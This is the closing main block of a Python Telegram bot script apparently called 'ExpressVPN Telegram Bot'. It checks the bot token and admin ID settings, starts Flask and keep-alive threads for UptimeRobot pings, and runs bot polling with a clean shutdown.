# --- MAIN ---
if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("Paste your bot token into BOT_TOKEN at the top of the script.")
        sys.exit(1)
    if not ADMIN_IDS or 123456789 in ADMIN_IDS:
        print("Paste your telegram user id into ADMIN_IDS at the top of the script.")
        sys.exit(1)
    
    print("ExpressVPN Telegram Bot starting...")
    print("Ctrl+C to stop")
    
    # Start Flask server for UptimeRobot
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Start keep-alive thread
    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    
    try:
        # Start bot polling
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except KeyboardInterrupt:
        shutdown_event.set()
        print("\nShutting down.")
        sys.exit(0)
